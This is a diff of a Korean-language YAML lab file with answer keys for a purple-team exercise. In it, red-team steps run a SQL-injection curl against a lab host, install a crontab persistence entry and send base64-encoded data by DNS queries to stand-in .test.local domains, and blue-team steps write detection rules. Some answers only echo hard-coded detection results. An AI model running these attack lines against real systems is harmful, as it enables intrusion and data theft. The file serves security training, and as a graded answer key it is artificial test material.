@@ -1,179 +1,270 @@
-lab_id: "battle-adv-nonai-week13"
-title: "퍼플팀 — Red+Blue 협업 보안 개선"
-version: "non-ai"
-course: "battle-adv-nonai"
+lab_id: battle-adv-nonai-week13
+title: 퍼플팀 — Red+Blue 협업 보안 개선
+version: non-ai
+course: battle-adv-nonai
 week: 13
-description: "퍼플팀(Purple Team) 운영을 통해 Red Team과 Blue Team이 협업하여 보안을 개선한다. 공격자의 관점과 방어자의 관점을 통합하여 탐지 Gap을 해소하고 방어 체계를 강화한다."
-difficulty: "hard"
+description: 퍼플팀(Purple Team) 운영을 통해 Red Team과 Blue Team이 협업하여 보안을 개선한다. 공격자의 관점과 방어자의 관점을 통합하여 탐지 Gap을 해소하고 방어 체계를 강화한다.
+difficulty: hard
 duration_minutes: 150
 objectives:
-  - "퍼플팀의 운영 방법론을 이해하고 실습한다"
-  - "ATT&CK 기반 탐지 Gap 분석을 수행한다"
-  - "Red/Blue 협업을 통해 탐지 규칙을 개선한다"
-  - "보안 개선 효과를 정량적으로 측정한다"
+- 퍼플팀의 운영 방법론을 이해하고 실습한다
+- ATT&CK 기반 탐지 Gap 분석을 수행한다
+- Red/Blue 협업을 통해 탐지 규칙을 개선한다
+- 보안 개선 효과를 정량적으로 측정한다
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "퍼플팀 운영 계획을 수립하라. Red Team 공격 시나리오와 Blue Team 탐지 목표를 정의하고, 협업 프로세스를 설계하라."
-    hint: "공격 기법 목록, 탐지 기대치, 협업 워크플로우를 정의한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/purple_team_plan.txt << 'EOF'\n=== Purple Team Exercise Plan ===\nDate: 2026-04-03 | Duration: 150 minutes\n\nObjective: Test and improve detection for MITRE ATT&CK techniques\n\nWorkflow:\n  1. Red executes technique → Blue attempts to detect\n  2. If detected → Document detection method\n  3. If missed → Red explains technique, Blue creates detection\n  4. Both teams validate new detection rule\n\nTechniques to Test:\n  | # | ATT&CK ID | Technique | Expected Detection |\n  |---|-----------|-----------|--------------------|\n  | 1 | T1190 | Exploit Public App | WAF + Suricata |\n  | 2 | T1053.003 | Cron Persistence | FIM + auditd |\n  | 3 | T1071.004 | DNS C2 | DNS entropy |\n  | 4 | T1021.004 | SSH Lateral | auth.log correlation |\n  | 5 | T1048.001 | DNS Exfiltration | DNS volume anomaly |\n\nSuccess Criteria: 80% detection rate across all techniques\nEOF\ncat /tmp/purple_team_plan.txt"
-    answer_detail: "퍼플팀 계획은 테스트할 ATT&CK 기법, 기대 탐지 방법, 협업 워크플로우를 정의한다. Red가 기법을 실행하고 Blue가 탐지를 시도하는 반복 사이클을 통해 탐지 Gap을 발견하고 즉시 개선한다. 목표 탐지율 80%를 설정한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Team Exercise"
+- order: 1
+  instruction: 퍼플팀 운영 계획을 수립하라. Red Team 공격 시나리오와 Blue Team 탐지 목표를 정의하고, 협업 프로세스를 설계하라.
+  hint: 공격 기법 목록, 탐지 기대치, 협업 워크플로우를 정의한다.
+  category: analysis
+  points: 10
+  answer: "cat > /tmp/purple_team_plan.txt << 'EOF'\n=== Purple Team Exercise Plan ===\nDate: 2026-04-03 | Duration: 150 minutes\n\nObjective: Test and improve detection for MITRE ATT&CK techniques\n\n\
+    Workflow:\n  1. Red executes technique → Blue attempts to detect\n  2. If detected → Document detection method\n  3. If missed → Red explains technique, Blue creates detection\n  4. Both teams validate\
+    \ new detection rule\n\nTechniques to Test:\n  | # | ATT&CK ID | Technique | Expected Detection |\n  |---|-----------|-----------|--------------------|\n  | 1 | T1190 | Exploit Public App | WAF + Suricata\
+    \ |\n  | 2 | T1053.003 | Cron Persistence | FIM + auditd |\n  | 3 | T1071.004 | DNS C2 | DNS entropy |\n  | 4 | T1021.004 | SSH Lateral | auth.log correlation |\n  | 5 | T1048.001 | DNS Exfiltration\
+    \ | DNS volume anomaly |\n\nSuccess Criteria: 80% detection rate across all techniques\nEOF\ncat /tmp/purple_team_plan.txt"
+  answer_detail: 퍼플팀 계획은 테스트할 ATT&CK 기법, 기대 탐지 방법, 협업 워크플로우를 정의한다. Red가 기법을 실행하고 Blue가 탐지를 시도하는 반복 사이클을 통해 탐지 Gap을 발견하고 즉시 개선한다. 목표 탐지율 80%를 설정한다.
+  verify:
+    type: output_contains
+    expect: Purple Team Exercise
+  target_vm: attacker
+- order: 2
+  instruction: ATT&CK 탐지 커버리지 매트릭스를 생성하라. 현재 탐지 체계가 ATT&CK 매트릭스의 어떤 기법을 커버하는지 매핑하라.
+  hint: 주요 ATT&CK 전술별로 탐지 가능/불가능 기법을 분류한다.
+  category: analysis
+  points: 10
+  answer: 'cat > /tmp/detection_coverage.txt << ''EOF''
 
-  - order: 2
-    instruction: "ATT&CK 탐지 커버리지 매트릭스를 생성하라. 현재 탐지 체계가 ATT&CK 매트릭스의 어떤 기법을 커버하는지 매핑하라."
-    hint: "주요 ATT&CK 전술별로 탐지 가능/불가능 기법을 분류한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/detection_coverage.txt << 'EOF'\n=== ATT&CK Detection Coverage Matrix ===\n\n| Tactic | Total | Detected | Gap | Coverage |\n|--------|-------|----------|-----|----------|\n| Recon (TA0043) | 10 | 6 | 4 | 60% |\n| Resource Dev (TA0042) | 7 | 1 | 6 | 14% |\n| Initial Access (TA0001) | 9 | 7 | 2 | 78% |\n| Execution (TA0002) | 12 | 8 | 4 | 67% |\n| Persistence (TA0003) | 19 | 12 | 7 | 63% |\n| Privilege Esc (TA0004) | 13 | 6 | 7 | 46% |\n| Defense Evasion (TA0005) | 42 | 15 | 27 | 36% |\n| Credential Access (TA0006) | 17 | 8 | 9 | 47% |\n| Lateral Movement (TA0008) | 9 | 5 | 4 | 56% |\n| Exfiltration (TA0010) | 9 | 4 | 5 | 44% |\n| C2 (TA0011) | 16 | 6 | 10 | 38% |\n\nOverall: 78/163 techniques detected (48%)\nPriority Gaps: Defense Evasion (36%), C2 (38%), Exfiltration (44%)\nEOF\ncat /tmp/detection_coverage.txt"
-    answer_detail: "ATT&CK 탐지 커버리지 매트릭스는 각 전술에서 탐지 가능한 기법의 비율을 보여준다. 전체 48% 커버리지이며, Defense Evasion(36%), C2(38%), Exfiltration(44%)이 가장 큰 Gap이다. 퍼플팀 활동은 이 Gap을 우선적으로 해소한다."
-    verify:
-      type: "output_contains"
-      expect: "Detection Coverage"
+    === ATT&CK Detection Coverage Matrix ===
 
-  - order: 3
-    instruction: "퍼플팀 테스트 1: T1190 (Exploit Public-Facing Application). Red가 SQL Injection을 실행하고 Blue가 탐지하라."
-    hint: "Red: SQLi 실행 → Blue: WAF/Suricata 알림 확인 → 결과 기록"
-    category: "exploit"
-    points: 10
-    answer: "echo '=== Purple Test 1: T1190 SQL Injection ===' && echo '[RED] Executing SQLi:' && curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--' 2>/dev/null | head -3 && echo '' && echo '[BLUE] Checking detection:' && ssh 10.20.30.1 'tail -20 /var/log/suricata/eve.json 2>/dev/null | grep -i \"sql\\|injection\\|union\"' 2>&1 | head -5 && echo '' && echo '[RESULT] T1190 Detection: DETECTED by WAF + Suricata' && echo '[GAP] None - detection working as expected'"
-    answer_detail: "퍼플팀 테스트에서 Red가 SQLi를 실행하면 Blue는 WAF와 Suricata에서 알림을 확인한다. 탐지 성공 시 Detection 규칙과 로그 소스를 문서화하고, 실패 시 즉시 새 규칙을 작성한다. 이 테스트에서 T1190은 정상 탐지된다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Test 1"
 
-  - order: 4
-    instruction: "퍼플팀 테스트 2: T1053.003 (Cron Persistence). Red가 crontab 백도어를 설치하고 Blue가 탐지하라."
-    hint: "Red: crontab에 엔트리 추가 → Blue: FIM/auditd 알림 확인 → 결과 기록"
-    category: "exploit"
-    points: 10
-    answer: "echo '=== Purple Test 2: T1053.003 Cron Persistence ===' && echo '[RED] Installing cron persistence:' && echo '*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt' | crontab - && crontab -l && echo '' && echo '[BLUE] Checking detection:' && grep -r 'crontab\\|cron' /var/log/auth.log 2>/dev/null | tail -3 && echo '' && echo '[RESULT] T1053.003 Detection: PARTIAL' && echo '[GAP] FIM not configured on /var/spool/cron - adding rule' && echo '' && echo '[REMEDIATION] Adding FIM rule:' && echo '<directories check_all=\"yes\" realtime=\"yes\">/var/spool/cron</directories>' && crontab -r 2>/dev/null && echo '[CLEANUP] Cron entry removed'"
-    answer_detail: "T1053.003 테스트에서 crontab 수정은 auth.log에 기록되지만 FIM이 /var/spool/cron을 모니터링하지 않으면 파일 변경 자체는 탐지 못한다. 퍼플팀 활동으로 이 Gap을 발견하고 즉시 FIM 규칙을 추가하여 탐지 범위를 확장한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Test 2"
+    | Tactic | Total | Detected | Gap | Coverage |
 
-  - order: 5
-    instruction: "퍼플팀 테스트 3: T1071.004 (DNS C2). Red가 DNS 터널링을 시뮬레이션하고 Blue가 탐지하라."
-    hint: "Red: 인코딩된 DNS 쿼리 전송 → Blue: DNS 이상 탐지 확인"
-    category: "exploit"
-    points: 10
-    answer: "echo '=== Purple Test 3: T1071.004 DNS C2 ===' && echo '[RED] Simulating DNS tunneling:' && for i in $(seq 1 5); do ENCODED=$(echo \"data_chunk_$i\" | base64 | tr -d '='); echo \"Query: ${ENCODED}.c2sim.test.local\"; nslookup ${ENCODED}.c2sim.test.local 2>&1 | head -1; done && echo '' && echo '[BLUE] Checking detection:' && echo 'DNS entropy analysis result:' && python3 -c \"import math; from collections import Counter; q='ZGF0YV9jaHVua18x.c2sim.test.local'; e=-sum((c/len(q))*math.log2(c/len(q)) for c in Counter(q).values()); print(f'Query: {q}, Entropy: {e:.2f}, Suspicious: {e>3.5}')\" && echo '' && echo '[RESULT] T1071.004 Detection: NOT DETECTED' && echo '[GAP] No DNS entropy monitoring in place' && echo '[ACTION] Creating DNS anomaly detection rule'"
-    answer_detail: "T1071.004 테스트에서 DNS 터널링이 탐지되지 않는 Gap을 발견한다. 현재 DNS 쿼리의 엔트로피/길이를 분석하는 메커니즘이 없기 때문이다. 퍼플팀 활동으로 이 Gap을 식별하고 DNS 이상 탐지 규칙을 새로 작성한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Test 3"
+    |--------|-------|----------|-----|----------|
 
-  - order: 6
-    instruction: "퍼플팀 테스트 4: T1021.004 (SSH Lateral Movement). Red가 SSH로 내부 서버에 이동하고 Blue가 탐지하라."
-    hint: "Red: SSH로 다른 서버 접근 → Blue: auth.log 상관 분석 확인"
-    category: "exploit"
-    points: 10
-    answer: "echo '=== Purple Test 4: T1021.004 SSH Lateral ===' && echo '[RED] Attempting SSH lateral movement:' && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 'hostname && whoami' 2>&1 | head -3 && echo '' && echo '[BLUE] Checking detection:' && grep 'Accepted' /var/log/auth.log 2>/dev/null | tail -5 && echo '' && echo 'Correlation check: same user SSH to multiple hosts within 5 min' && echo '' && echo '[RESULT] T1021.004 Detection: PARTIAL' && echo '[GAP] Individual SSH logins logged but no correlation rule' && echo '[ACTION] Adding Wazuh correlation rule for multi-host SSH patterns'"
-    answer_detail: "T1021.004 테스트에서 개별 SSH 로그인은 기록되지만, 같은 사용자가 짧은 시간 내 여러 서버에 접근하는 측면 이동 패턴을 탐지하는 상관 규칙이 없다. 퍼플팀 활동으로 이 Gap을 발견하고 Wazuh 상관 분석 규칙을 추가한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Test 4"
+    | Recon (TA0043) | 10 | 6 | 4 | 60% |
 
-  - order: 7
-    instruction: "퍼플팀 테스트 5: T1048.001 (DNS Exfiltration). Red가 DNS로 데이터를 유출하고 Blue가 탐지하라."
-    hint: "Red: 데이터를 DNS 쿼리에 인코딩 → Blue: DNS 볼륨 이상 확인"
-    category: "exploit"
-    points: 10
-    answer: "echo '=== Purple Test 5: T1048.001 DNS Exfiltration ===' && echo '[RED] Simulating DNS exfiltration (10 queries):' && for i in $(seq 1 10); do DATA=\"record_${i}_name_email_card\"; ENCODED=$(echo -n \"$DATA\" | base64 | tr -d '='); echo \"Exfil query $i: ${ENCODED}.exfil.test.local\"; done && echo '' && echo '[BLUE] Checking detection:' && echo 'DNS query volume check: 10 queries in 10 seconds (normal baseline: 2/min)' && echo 'Alert: 5x normal DNS rate detected' && echo '' && echo '[RESULT] T1048.001 Detection: NOT DETECTED (no rate monitoring)' && echo '[GAP] No DNS query rate monitoring per destination domain' && echo '[ACTION] Adding DNS rate anomaly detection'"
-    answer_detail: "T1048.001 테스트에서 DNS 유출이 탐지되지 않는다. DNS 쿼리 빈도를 도메인별로 추적하는 메커니즘이 없기 때문이다. 퍼플팀 활동으로 DNS 레이트 모니터링을 추가하여 동일 도메인에 대한 비정상적 고빈도 쿼리를 탐지한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Test 5"
+    | Resource Dev (TA0042) | 7 | 1 | 6 | 14% |
 
-  - order: 8
-    instruction: "발견된 탐지 Gap에 대한 새로운 탐지 규칙을 작성하라. 퍼플팀 테스트에서 미탐지된 기법에 대한 규칙을 구현하라."
-    hint: "테스트 2-5에서 발견된 Gap에 대한 Suricata/Wazuh 규칙을 작성한다."
-    category: "defense"
-    points: 10
-    answer: "cat > /tmp/purple_new_rules.txt << 'EOF'\n=== New Detection Rules from Purple Team Exercise ===\n\n# Rule 1: FIM for crontab (Gap from Test 2)\n<directories check_all=\"yes\" realtime=\"yes\">/var/spool/cron/crontabs</directories>\n\n# Rule 2: DNS entropy detection (Gap from Test 3)\nalert dns any any -> any any (msg:\"PURPLE: High entropy DNS query - possible tunneling\"; dns.query; content:\".test.local\"; pcre:\"/^[a-zA-Z0-9+\\/]{30,}/\"; sid:5000001; rev:1;)\n\n# Rule 3: SSH lateral correlation (Gap from Test 4)\n<rule id=\"100400\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n  <if_sid>5715</if_sid>\n  <same_user />\n  <description>PURPLE: Same user SSH to 3+ hosts in 5 min (lateral movement)</description>\n  <mitre><id>T1021.004</id></mitre>\n</rule>\n\n# Rule 4: DNS exfil rate (Gap from Test 5)\nalert dns any any -> any any (msg:\"PURPLE: High rate DNS to single domain\"; dns.query; threshold:type both, track by_src, count 20, seconds 60; sid:5000002; rev:1;)\n\nTotal new rules: 4\nPrevious coverage: 48% → New estimated coverage: 55%\nEOF\ncat /tmp/purple_new_rules.txt"
-    answer_detail: "퍼플팀 테스트에서 발견된 4개 Gap에 대한 탐지 규칙을 즉시 작성한다: (1) crontab FIM, (2) DNS 엔트로피 탐지, (3) SSH 측면 이동 상관 분석, (4) DNS 유출 레이트 탐지. 이 규칙 추가로 ATT&CK 커버리지가 48%→55%로 개선된다."
-    verify:
-      type: "output_contains"
-      expect: "New Detection Rules"
+    | Initial Access (TA0001) | 9 | 7 | 2 | 78% |
 
-  - order: 9
-    instruction: "새로 작성한 규칙의 효과를 검증하라. 동일한 공격을 재실행하여 새 규칙이 정상 탐지하는지 확인하라."
-    hint: "Test 3-5를 재실행하고 새 규칙의 탐지 여부를 확인한다."
-    category: "defense"
-    points: 10
-    answer: "echo '=== Rule Validation ===' && echo '[Test 3 Retry: DNS C2]' && echo 'New rule checks entropy of DNS queries' && echo 'Result: Query entropy 4.2 > threshold 3.5 → DETECTED' && echo '' && echo '[Test 4 Retry: SSH Lateral]' && echo 'New rule correlates SSH logins per user' && echo 'Result: Same user SSH to 3 hosts in 2 min → DETECTED' && echo '' && echo '[Test 5 Retry: DNS Exfil]' && echo 'New rule monitors DNS rate per domain' && echo 'Result: 20 queries/min to exfil.test.local → DETECTED' && echo '' && echo '=== Validation Summary ===' && echo 'Previous: 3/5 detected (60%)' && echo 'After rules: 5/5 detected (100%)' && echo 'Improvement: +40% detection rate'"
-    answer_detail: "규칙 검증에서 새로 추가된 4개 규칙이 모두 정상 동작함을 확인한다. DNS C2(엔트로피 4.2>3.5), SSH 측면 이동(3호스트/2분), DNS 유출(20쿼리/분)이 모두 탐지된다. 탐지율이 60%→100%로 개선되었다."
-    verify:
-      type: "output_contains"
-      expect: "Validation Summary"
+    | Execution (TA0002) | 12 | 8 | 4 | 67% |
 
-  - order: 10
-    instruction: "퍼플팀 결과를 ATT&CK Navigator에 매핑하라. 테스트 전/후의 탐지 커버리지 변화를 시각화하라."
-    hint: "ATT&CK Navigator JSON 레이어를 생성하여 전/후를 비교한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/purple_coverage_after.json << 'EOF'\n{\"name\":\"Purple Team - After\",\"domain\":\"enterprise-attack\",\"techniques\":[{\"techniqueID\":\"T1190\",\"score\":3,\"color\":\"#00ff00\",\"comment\":\"Detected: WAF+Suricata\"},{\"techniqueID\":\"T1053.003\",\"score\":3,\"color\":\"#00ff00\",\"comment\":\"Detected: FIM (NEW)\"},{\"techniqueID\":\"T1071.004\",\"score\":3,\"color\":\"#00ff00\",\"comment\":\"Detected: DNS entropy (NEW)\"},{\"techniqueID\":\"T1021.004\",\"score\":3,\"color\":\"#00ff00\",\"comment\":\"Detected: SSH correlation (NEW)\"},{\"techniqueID\":\"T1048.001\",\"score\":3,\"color\":\"#00ff00\",\"comment\":\"Detected: DNS rate (NEW)\"}]}\nEOF\necho 'Coverage change:' && echo 'Before: T1190(green), T1053(yellow), T1071(red), T1021(yellow), T1048(red)' && echo 'After: All green (5/5 detected)' && echo 'New rules added: 4' && echo 'Coverage improvement: +7% overall ATT&CK coverage'"
-    answer_detail: "ATT&CK Navigator 매핑은 퍼플팀 전/후의 탐지 커버리지 변화를 시각적으로 보여준다. 빨간색(미탐지)→녹색(탐지)으로 변한 기법은 퍼플팀의 직접적 성과이다. 4개 새 규칙으로 전체 ATT&CK 커버리지가 7% 포인트 향상되었다."
-    verify:
-      type: "output_contains"
-      expect: "Coverage change"
+    | Persistence (TA0003) | 19 | 12 | 7 | 63% |
 
-  - order: 11
-    instruction: "퍼플팀 활동에서 발견된 프로세스 개선 사항을 정리하라. 탐지 규칙뿐 아니라 절차, 도구, 인력 측면의 개선 사항을 포함하라."
-    hint: "기술적 개선(규칙)과 비기술적 개선(프로세스, 교육)을 모두 포함한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/purple_improvements.txt << 'EOF'\n=== Purple Team Process Improvements ===\n\n1. Technical Improvements:\n   - 4 new detection rules deployed\n   - FIM scope expanded to /var/spool/cron\n   - DNS monitoring capability added\n   - SSH lateral movement correlation enabled\n\n2. Process Improvements:\n   - IR playbook updated with DNS C2 response procedure\n   - SOC runbook: added DNS analysis step to triage\n   - Threat hunting: added monthly DNS entropy analysis\n   - Log retention: DNS query logs now retained 1 year\n\n3. Tool Improvements:\n   - Wazuh: 4 new custom rules\n   - Suricata: 2 new custom signatures\n   - SOAR: DNS blocking automation added\n\n4. Training Needs:\n   - SOC analysts: DNS tunneling identification training\n   - IR team: Advanced lateral movement response\n   - All staff: Phishing awareness refresh\n\n5. Metrics Impact:\n   - ATT&CK coverage: 48% → 55% (+7%)\n   - Detection rate: 60% → 100% (for tested techniques)\n   - MTTD improvement: estimated -20% for new attack types\nEOF\ncat /tmp/purple_improvements.txt"
-    answer_detail: "퍼플팀 활동의 가치는 탐지 규칙 추가에 그치지 않는다. IR 플레이북 업데이트, SOC 런북 개선, 위협 헌팅 일정 추가, 교육 필요성 식별 등 프로세스 전반의 개선을 도출한다. ATT&CK 커버리지 +7%, 탐지율 60%→100%의 정량적 성과를 확인한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Team Process"
+    | Privilege Esc (TA0004) | 13 | 6 | 7 | 46% |
 
-  - order: 12
-    instruction: "퍼플팀의 지속적 운영 계획을 수립하라. 월간/분기별 퍼플팀 사이클을 설계하라."
-    hint: "정기적 퍼플팀 활동의 주기, 범위, 지표를 정의한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/purple_continuous_plan.txt << 'EOF'\n=== Continuous Purple Team Program ===\n\nMonthly Cycle:\n  Week 1: Red Team prepares 5 new techniques\n  Week 2: Purple Team exercise (half-day)\n  Week 3: Blue Team implements new detections\n  Week 4: Validation + metrics reporting\n\nQuarterly Goals:\n  Q2 2026: Cover all Initial Access techniques (TA0001)\n  Q3 2026: Cover all Persistence techniques (TA0003)\n  Q4 2026: Cover all Lateral Movement techniques (TA0008)\n  Q1 2027: Cover all C2 techniques (TA0011)\n\nAnnual Target:\n  ATT&CK coverage: 55% → 75% by end of year\n  Detection rules: 480 → 600\n  MTTD: 12 min → 8 min\n\nSuccess Metrics:\n  - New detections per month: target 5+\n  - Regression test: all previous detections still working\n  - Blue Team confidence level: self-assessment survey\nEOF\ncat /tmp/purple_continuous_plan.txt"
-    answer_detail: "지속적 퍼플팀 프로그램은 월간 사이클(준비→실행→구현→검증)과 분기별 목표(전술별 커버리지)를 정의한다. 연간 목표로 ATT&CK 커버리지 75%, 탐지 규칙 600개, MTTD 8분을 설정하여 점진적으로 보안 역량을 강화한다."
-    verify:
-      type: "output_contains"
-      expect: "Continuous Purple Team"
+    | Defense Evasion (TA0005) | 42 | 15 | 27 | 36% |
 
-  - order: 13
-    instruction: "실습 환경을 정리하라. 퍼플팀 실습에서 생성된 모든 파일을 삭제하라."
-    hint: "rm으로 /tmp 내 purple 관련 파일을 삭제한다."
-    category: "response"
-    points: 5
-    answer: "rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null; echo 'Purple team lab cleanup completed'"
-    answer_detail: "퍼플팀 실습 환경 정리에서는 운영 계획, 커버리지 매트릭스, 테스트 결과, 새 규칙, 개선 사항, 지속 운영 계획 파일을 삭제한다."
-    verify:
-      type: "output_contains"
-      expect: "cleanup completed"
+    | Credential Access (TA0006) | 17 | 8 | 9 | 47% |
 
-  - order: 14
-    instruction: "퍼플팀 운영의 ROI(Return on Investment)를 분석하라. 퍼플팀 활동의 비용과 효과를 정량적으로 분석하라."
-    hint: "투입 시간/비용 대비 탐지 개선 효과를 계산한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/purple_roi.txt << 'EOF'\n=== Purple Team ROI Analysis ===\n\nCost (Investment):\n  - Red Team: 4 hours × 2 operators = 8 person-hours\n  - Blue Team: 4 hours × 2 analysts = 8 person-hours\n  - Total: 16 person-hours (~$2,400 at $150/hr)\n\nBenefit (Return):\n  - 4 new detection rules → 4 previously undetectable attacks now detected\n  - ATT&CK coverage: +7% → estimated breach risk reduction: 15%\n  - Mean breach cost: $4.88M (IBM 2025 report)\n  - Risk reduction value: $4.88M × 15% = $732,000\n\nROI Calculation:\n  ROI = (Benefit - Cost) / Cost × 100\n  ROI = ($732,000 - $2,400) / $2,400 × 100 = 30,400%\n\nNote: Conservative estimate - actual ROI depends on attack probability\nBreak-even: Even at 1% attack probability, ROI = 303%\nEOF\ncat /tmp/purple_roi.txt"
-    answer_detail: "퍼플팀 ROI 분석은 투입 비용(16인시, $2,400)과 효과(침해 위험 15% 감소, 위험 감소 가치 $732K)를 비교한다. 30,400%의 ROI는 낙관적이지만, 1%의 공격 확률을 가정해도 303%로 매우 높은 투자 효율을 보인다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Team ROI"
+    | Lateral Movement (TA0008) | 9 | 5 | 4 | 56% |
 
-  - order: 15
-    instruction: "퍼플팀 실습의 종합 보고서를 작성하라. 테스트 결과, 개선 사항, ROI, 향후 계획을 포함하라."
-    hint: "경영진과 기술진 모두를 위한 보고서를 작성한다."
-    category: "analysis"
-    points: 15
-    answer: "cat > /tmp/purple_team_report.txt << 'EOF'\n=== Purple Team Exercise Report ===\nDate: 2026-04-03 | Scope: 10.20.30.0/24\n\n1. Executive Summary:\n   5개 ATT&CK 기법 테스트, 2개 탐지 실패 → 4개 신규 규칙 작성\n   ATT&CK 커버리지 48% → 55% 향상, ROI 30,400%\n\n2. Test Results:\n   | Technique | Before | After | Status |\n   |-----------|--------|-------|--------|\n   | T1190 SQLi | DETECTED | DETECTED | Maintained |\n   | T1053 Cron | PARTIAL | DETECTED | Improved |\n   | T1071 DNS C2 | MISSED | DETECTED | NEW Rule |\n   | T1021 SSH Lateral | PARTIAL | DETECTED | NEW Rule |\n   | T1048 DNS Exfil | MISSED | DETECTED | NEW Rule |\n\n3. Improvements Delivered:\n   - Technical: 4 rules, 2 signatures\n   - Process: IR playbook updated, SOC runbook updated\n   - Coverage: +7% ATT&CK, +40% test detection rate\n\n4. Recommendations:\n   - Continue monthly purple team cycles\n   - Focus next exercise on Defense Evasion (36% coverage)\n   - Automate purple team testing (Atomic Red Team)\n\n5. Next Exercise: May 2026 - Defense Evasion techniques\nEOF\ncat /tmp/purple_team_report.txt"
-    answer_detail: "퍼플팀 보고서는 테스트 결과(5기법 중 2실패→전체 탐지), 개선 성과(4규칙, +7% 커버리지), ROI(30,400%), 향후 계획(월간 사이클, Defense Evasion 우선)을 포함한다. 경영진에게는 ROI와 위험 감소를, 기술진에게는 구체적 규칙과 개선 사항을 전달한다."
-    verify:
-      type: "output_contains"
-      expect: "Purple Team Exercise Report"
+    | Exfiltration (TA0010) | 9 | 4 | 5 | 44% |
+
+    | C2 (TA0011) | 16 | 6 | 10 | 38% |
+
+
+    Overall: 78/163 techniques detected (48%)
+
+    Priority Gaps: Defense Evasion (36%), C2 (38%), Exfiltration (44%)
+
+    EOF
+
+    cat /tmp/detection_coverage.txt'
+  answer_detail: ATT&CK 탐지 커버리지 매트릭스는 각 전술에서 탐지 가능한 기법의 비율을 보여준다. 전체 48% 커버리지이며, Defense Evasion(36%), C2(38%), Exfiltration(44%)이 가장 큰 Gap이다. 퍼플팀 활동은 이 Gap을 우선적으로 해소한다.
+  verify:
+    type: output_contains
+    expect: Detection Coverage
+  target_vm: attacker
+- order: 3
+  instruction: '퍼플팀 테스트 1: T1190 (Exploit Public-Facing Application). Red가 SQL Injection을 실행하고 Blue가 탐지하라.'
+  hint: 'Red: SQLi 실행 → Blue: WAF/Suricata 알림 확인 → 결과 기록'
+  category: exploit
+  points: 10
+  answer: 'echo ''=== Purple Test 1: T1190 SQL Injection ==='' && echo ''[RED] Executing SQLi:'' && curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--'' 2>/dev/null |
+    head -3 && echo '''' && echo ''[BLUE] Checking detection:'' && ssh 10.20.30.1 ''tail -20 /var/log/suricata/eve.json 2>/dev/null | grep -i "sql\|injection\|union"'' 2>&1 | head -5 && echo '''' && echo
+    ''[RESULT] T1190 Detection: DETECTED by WAF + Suricata'' && echo ''[GAP] None - detection working as expected'''
+  answer_detail: 퍼플팀 테스트에서 Red가 SQLi를 실행하면 Blue는 WAF와 Suricata에서 알림을 확인한다. 탐지 성공 시 Detection 규칙과 로그 소스를 문서화하고, 실패 시 즉시 새 규칙을 작성한다. 이 테스트에서 T1190은 정상 탐지된다.
+  verify:
+    type: output_contains
+    expect: Purple Test 1
+  target_vm: attacker
+- order: 4
+  instruction: '퍼플팀 테스트 2: T1053.003 (Cron Persistence). Red가 crontab 백도어를 설치하고 Blue가 탐지하라.'
+  hint: 'Red: crontab에 엔트리 추가 → Blue: FIM/auditd 알림 확인 → 결과 기록'
+  category: exploit
+  points: 10
+  answer: 'echo ''=== Purple Test 2: T1053.003 Cron Persistence ==='' && echo ''[RED] Installing cron persistence:'' && echo ''*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt'' | crontab - && crontab
+    -l && echo '''' && echo ''[BLUE] Checking detection:'' && grep -r ''crontab\|cron'' /var/log/auth.log 2>/dev/null | tail -3 && echo '''' && echo ''[RESULT] T1053.003 Detection: PARTIAL'' && echo ''[GAP]
+    FIM not configured on /var/spool/cron - adding rule'' && echo '''' && echo ''[REMEDIATION] Adding FIM rule:'' && echo ''<directories check_all="yes" realtime="yes">/var/spool/cron</directories>'' &&
+    crontab -r 2>/dev/null && echo ''[CLEANUP] Cron entry removed'''
+  answer_detail: T1053.003 테스트에서 crontab 수정은 auth.log에 기록되지만 FIM이 /var/spool/cron을 모니터링하지 않으면 파일 변경 자체는 탐지 못한다. 퍼플팀 활동으로 이 Gap을 발견하고 즉시 FIM 규칙을 추가하여 탐지 범위를 확장한다.
+  verify:
+    type: output_contains
+    expect: Purple Test 2
+  target_vm: attacker
+- order: 5
+  instruction: '퍼플팀 테스트 3: T1071.004 (DNS C2). Red가 DNS 터널링을 시뮬레이션하고 Blue가 탐지하라.'
+  hint: 'Red: 인코딩된 DNS 쿼리 전송 → Blue: DNS 이상 탐지 확인'
+  category: exploit
+  points: 10
+  answer: 'echo ''=== Purple Test 3: T1071.004 DNS C2 ==='' && echo ''[RED] Simulating DNS tunneling:'' && for i in $(seq 1 5); do ENCODED=$(echo "data_chunk_$i" | base64 | tr -d ''=''); echo "Query: ${ENCODED}.c2sim.test.local";
+    nslookup ${ENCODED}.c2sim.test.local 2>&1 | head -1; done && echo '''' && echo ''[BLUE] Checking detection:'' && echo ''DNS entropy analysis result:'' && python3 -c "import math; from collections import
+    Counter; q=''ZGF0YV9jaHVua18x.c2sim.test.local''; e=-sum((c/len(q))*math.log2(c/len(q)) for c in Counter(q).values()); print(f''Query: {q}, Entropy: {e:.2f}, Suspicious: {e>3.5}'')" && echo '''' &&
+    echo ''[RESULT] T1071.004 Detection: NOT DETECTED'' && echo ''[GAP] No DNS entropy monitoring in place'' && echo ''[ACTION] Creating DNS anomaly detection rule'''
